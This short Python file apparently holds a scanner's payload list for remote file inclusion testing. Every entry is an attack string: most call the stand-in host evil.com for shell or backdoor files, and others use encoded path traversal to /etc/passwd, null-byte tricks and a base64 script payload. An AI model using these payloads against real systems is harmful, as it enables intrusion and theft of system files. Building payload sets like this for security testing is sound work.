# -*- coding: utf-8 -*-

rfi_payloads = [
    "http://evil.com/malicious_script.php",
    "http://evil.com/shell.php",
    "http://evil.com/backdoor.txt",
    "http://evil.com/evil_payload.txt",
    "http://evil.com/attackers_script",
    "http://evil.com/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
    "http://evil.com/%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
    "http%3A%2F%2Fevil.com%2Fmalicious_script.php",
    "data:text/plain;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b",
    "http%253A%252F%252Fevil.com%252Fmalicious_script.php",
    "http://evil.com/malicious_script.php%00",
    "\\evil.com\malicious_script.php"
]
